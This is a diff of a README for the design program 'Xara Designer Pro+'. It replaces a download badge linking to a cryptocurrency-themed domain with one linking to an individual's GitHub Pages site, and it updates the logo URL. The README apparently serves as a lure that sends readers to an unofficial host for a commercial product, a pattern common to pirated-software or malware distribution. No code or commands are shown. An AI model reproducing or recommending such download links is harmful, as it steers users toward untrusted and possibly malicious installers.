@@ -2,7 +2,8 @@
 
 Xara Designer Pro+ mixes vector, layout, and web export with fast rendering and live effects.
 
-[![Download Xara Designer Pro+](https://img.shields.io/badge/Download-Xara_Designer_Pro+-blueviolet)](https://cryptoenthusiasts.world/)
+[![GET Xara Designer](https://img.shields.io/badge/GET%20%E2%80%94%20Xara-Designer-0078D6?style=for-the-badge&logoColor=white)](https://helenwilliamsp827.github.io/.github/XaraDesigner)
+
 
 ---
 
@@ -68,7 +69,7 @@ Xara Designer Pro+ mixes vector, layout, and web export with fast rendering and 
 ### 🖼 Preview
 
 **1. Xara Designer Pro+ Logo**  
-![Xara Designer Pro+ Logo](https://logo.clearbit.com/xara.com)  
+![Xara Designer Pro+ Logo](https://www.xara.com/wp-content/uploads/2022/07/uncategorized-19423.jpg)  
 *A recognizable logo for Xara Designer Pro+ used for quick identification in docs and listings.*
 
 ---
